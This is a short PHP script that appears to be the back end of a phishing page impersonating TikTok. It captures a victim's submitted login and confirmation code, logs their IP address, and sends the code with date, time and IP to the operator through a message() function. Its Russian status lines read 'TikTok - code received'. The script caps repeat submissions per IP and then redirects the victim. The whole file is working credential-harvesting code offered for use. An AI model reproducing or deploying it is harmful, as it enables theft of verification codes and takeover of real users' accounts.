<?php 

require 'data.php';
ini_set('session.gc_maxlifetime', 3600);
ini_set('session.cookie_lifetime', 3600);
session_start();


$Login = $_POST['login'];
$code = $_POST['code'];

$data = date("d.m.Y");
$time = date("H:i");   
$ip0 = $_SERVER['REMOTE_ADDR'];
$iplogs = fopen('iplogs.php','a+');
fwrite($iplogs, $ip0); 
fclose($log);
 
$res = " 
🇷🇺 Версия страницы: RU

🛠 Дата и время: $data $time 

❄️ IP-адрес: $ip0"; 

function ipcheck($Login,$code,$res) {
	if($_SESSION['number'] > 6) {
		session_commit();
		echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=/error'></head></html>";
		die();
	}
	else {
		$_SESSION['number'] += 1;
		message("Статус: 🔥 [TikTok - Получен код]

👥 Код подтверждения: " . $code.'
'.$res);
	}
	return $_SESSION;
}

if (mb_substr_count(file_get_contents('iplogs.php'), $ip0) < 7) {
	ipcheck($Login,$code,$res);
}
else {
	echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=/error'></head></html>";
}


session_commit();
header('Location: '.$redirect);
die();


?>		
